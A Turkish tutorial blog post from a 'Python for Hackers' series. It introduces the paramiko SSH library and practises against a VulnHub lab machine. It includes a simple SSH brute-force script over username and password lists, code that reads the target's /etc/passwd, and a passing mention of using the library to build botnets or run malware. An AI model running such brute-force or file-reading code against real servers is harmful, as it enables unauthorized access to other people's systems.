---
date: '2022-09-26'
description: Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
draft: false
featuredImage: https://cdn-images-1.medium.com/max/800/1*cHmfmYLtoze7wtcUFY5BVA.png
layout: single
series:
- Hakerlar için Python
title: 'Hakerlar için Python: paramiko'
type: posts
---

### **Hakerlar için Python: paramiko**



### Giriş

Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan *paramiko* modülünü tanıyacağız.

### paramiko nedir?

**SSH** (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.

Paramiko Python ile SSH bağlantılarını kolaylıkla yapmamızı sağlayan bir modüldür. Bu sayede Python ile uzak sunucuları yöneten uygulamalar yazabiliriz. Örneğin; bir botnet kurabilir, uzak bir sunucu üzerinde zararlı yazılım çalıştırabilir ya da SSH zafiyetlerini tarayan uygulamalar yazabiliriz. Şimdi bu modülü nasıl kullanacağımıza bir bakalım.

### Kurulum

Paramiko kurulumu için aşağıdaki aşağıdaki kodu terminal ekranında çalıştırınız.

```
pip install paramiko
```

Ardından bir python dosyası açıp modülü projemize dahil edebiliriz.

```
import paramiko
```

şimdi paramiko modülü ile bir SSH bağlantısı yapalım

### Paramiko Modülü nasıl kullanılır?

Paramiko modülü ile SSH bağlantısı kurmak için;

```
import paramiko
```

```
IP = "ip adresi"  
USERNAME = "kullanıcı adı"  
PASSWORD = "şifre"  
PORT = 22  
COMMAND = "komut"
```

```
ssh = paramiko.SSHClient()  # SSH nesnesi oluşturma  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

```
ssh.connect(ip, username, password) # SSH bağlantısını kurma  
stdin, stdout, stderr = ssh.exec_command(command) # Komut çalıştırma  
print(stdout.read())
```

```
ssh.close()
```

Bu örnekte pramaiko modülü ile bir SSH client’ı oluşturduk. Uygulama belirtilen ip ve port adresine kullanıcı adı ve parola bilgileri ile bir bağlantı gerçekleştirir ve ‘whoami’ komutunu çalıştırır. Ardından dönen cevabı ekrana yazdırır ve SSH bağlantısını kapatır.

![](https://cdn-images-1.medium.com/max/800/1*yht4td7gjtuSn40eYD1_mQ.png)

Bu örnekte, sanal ortamda [Typhoon](https://www.vulnhub.com/entry/typhoon-102,267/) makinesini çalıştırarak SSH ile bağlandık. Şimdi bu modül ile daha neler yapabileceğimize bir bakalım.

### SSH brute force saldırısı

Paramiko ile SSH bağlantısı yapabilediğimize göre bir kabaa kuvvet saldırısı da yapabiliriz. Bunun için bir kullanıcı adı listesi bir de parola listesi oluşturacağız. Ardından bu listedeki bilgiler ile SSH bağlantısı kurmaya çalışacağız.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
username_list = []  
password_list = []
```

```
for i in username_list:  
    for j in password_list:  
        try:  
            ssh.connect(ip,username=i, password=j)  
            print(i,j)  
            ssh.close()  
        except:  
            pass
```

Yukarıdaki kodda saldırı için bir kullanıcı adı listesi bir de parola listesi gerekmektedir, bunları koddaki listelere ekleyebilirsiniz. Hedef ip adresi de ssh.connect() fonskiyonuna verilmelidir. Ardından kod çalıştırıldığında, ilgili ip adresine kullanıcı adı ve parola listelerindeki değerler teker teker denenir. Bu işlemde hedef sunucuda SSH servisinin açık olduğundan emin olun. Aksi takdirde, işlem başarısız olacaktır.

### Passwd dosyasını çekme

SSH bağlantısını sağladığımız taktirde, hedef sunucudan aldığımız shell ile istediğimiz işlemi yapabiliriz. Bunun için *ssh.exec\_command()* metodunu kullanırız.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
ssh.connect(ip, username, password)  
stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
print(stdout.read().decode(‘ascii’))
```

Yukarıdaki kod ile hedef sunucunun *passwd* dosyasını okuyup ekrana yazdırdık.

### Son

Sonuç olarak, paramiko modülü ile uzak sunuculara SSH bağlantısı yaptık ve sunucular üzerinde komut çalıştırdık. Paramiko ile başka ne tür uygulamalar yapılabilir yorumlara beklerim…